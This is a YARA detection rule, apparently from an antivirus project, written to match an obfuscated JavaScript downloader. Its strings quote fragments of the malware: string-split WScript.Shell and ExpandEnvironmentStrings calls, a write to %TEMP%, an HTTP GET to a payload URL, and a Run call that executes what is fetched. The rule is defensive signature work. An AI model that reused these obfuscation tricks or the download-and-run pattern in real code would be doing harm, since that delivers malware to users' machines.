rule sig_20160427_491f5e08577007852412f5a6e8a21616 {
  meta:
    description = "datamaliciousorder - file 20160427_491f5e08577007852412f5a6e8a21616.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c9fb8439b4baa86f73eb5d0a6fa0b9e293bba1a0575df98bcc46e5cc2853794d"

  strings:
    $s1  = "function PieifPdnht() {return UitnzHhpyz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Laj3U4z" ascii
    $s2  = "function PieifPdnht() {return UitnzHhpyz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Laj3U4z" ascii
    $s3  = "function FohsyOgdnk(FndxfUgzdf, ZyxbhMwuih){AszgnDngze = AszgnDngze * 1; return FndxfUgzdf - ZyxbhMwuih;};" fullword ascii
    $s4  = "var UitnzHhpyz = function RloxuJgukd() {return RwbalSkpsu[PctgaGepyl](\"WScript\"+\".Shell\");}(), LqefmHdfxi = 11;" fullword ascii
    $s5  = "XyokxLmifk[AqtbhNkrqz](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "function DtmpkMrera() {return ((OletvPeadp == true) && (OletvPeadp == NsigdDrlcf)) ? 1 : AszgnDngze;};" fullword ascii
    $s7  = "var RwbalSkpsu = this[\"WScript\"];" fullword ascii
    $s8  = "}while (ScspyKsbfq);" fullword ascii
    $s9  = "function RkyoiZpnye(){return NepkeImsvr + \"\";};" fullword ascii
    $s10 = "if (XyokxLmifk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "var NsigdDrlcf = false;" fullword ascii
    $s12 = "var OletvPeadp = false;" fullword ascii
    $s13 = "NsigdDrlcf = true; " fullword ascii
    $s14 = "var JbuhuWknym = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "ZgfojJzpdk = true;" fullword ascii
    $s16 = "function QebztTsssg()" fullword ascii
    $s17 = "function GrfjoTalnr(QbazjMvplk) {var XeylkAnrxe = (1, 2, 3, 4, 5, QbazjMvplk); return XeylkAnrxe;};" fullword ascii
    $s18 = "function CsbtdLgbhv(){return PctgaGepyl;};" fullword ascii
    $s19 = "function VfhndSwhye(){return 23;};" fullword ascii
    $s20 = "function NfiswKpgsm(QtausVjdzx){UitnzHhpyz[\"R\"+\"un\"](QtausVjdzx, AszgnDngze, AszgnDngze);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}